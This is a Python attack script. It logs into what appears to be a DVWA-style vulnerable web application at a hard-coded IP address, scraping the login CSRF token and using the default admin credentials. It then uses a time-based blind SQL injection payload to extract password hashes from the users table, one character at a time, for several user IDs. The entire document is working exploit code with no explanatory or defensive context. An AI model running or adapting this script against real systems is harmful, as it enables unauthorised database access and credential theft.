
import requests
import re
import time

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"

# First authenticate
session = requests.Session()
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    
    # Login
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    
    session.post(login_url, data=data)
    
    print("[*] Extracting password hashes using time-based blind SQL injection...")
    print("[*] This may take a while as we extract character by character...\n")
    
    # Function to check if a condition is true using time-based blind SQLi
    def check_condition(condition, timeout=3):
        # Payload: 1' AND IF(condition, SLEEP(5), 0) AND '1'='1
        payload = f"1' AND IF({condition}, SLEEP({timeout+1}), 0) AND '1'='1"
        
        params = {"id": payload, "Submit": "Submit"}
        
        start = time.time()
        try:
            response = session.get(sqli_url, params=params, timeout=timeout+5)
            elapsed = time.time() - start
            return elapsed > timeout
        except:
            return True  # Timeout means True
    
    # Get the first password hash
    print("[*] Extracting password for user_id=1...")
    password_hash = ""
    
    # ASCII characters that could be in MD5/SHA hashes
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    
    for position in range(1, 100):  # Limit iterations
        found = False
        for char in charset:
            # Check if character at position matches
            condition = f"SUBSTRING((SELECT password FROM users WHERE user_id=1), {position}, 1) = '{char}'"
            
            if check_condition(condition, timeout=2):
                password_hash += char
                print(f"[+] Position {position}: '{char}' -> {password_hash}")
                found = True
                break
        
        if not found:
            # No more characters
            print(f"[+] Extraction complete! Password hash: {password_hash}")
            break
    
    print(f"\n[+] Password hash for admin (user_id=1): {password_hash}")
    
    # Try to extract for other users
    print("\n[*] Extracting passwords for all users...")
    
    all_hashes = {}
    
    for user_id in range(1, 6):
        print(f"\n[*] Extracting password for user_id={user_id}...")
        password_hash = ""
        
        for position in range(1, 100):
            found = False
            for char in charset:
                condition = f"SUBSTRING((SELECT password FROM users WHERE user_id={user_id}), {position}, 1) = '{char}'"
                
                if check_condition(condition, timeout=1):
                    password_hash += char
                    found = True
                    break
            
            if not found:
                break
        
        if password_hash:
            all_hashes[user_id] = password_hash
            print(f"[+] User {user_id}: {password_hash}")
    
    print("\n[+] ALL EXTRACTED PASSWORD HASHES:")
    for user_id, hash_val in all_hashes.items():
        print(f"  User ID {user_id}: {hash_val}")

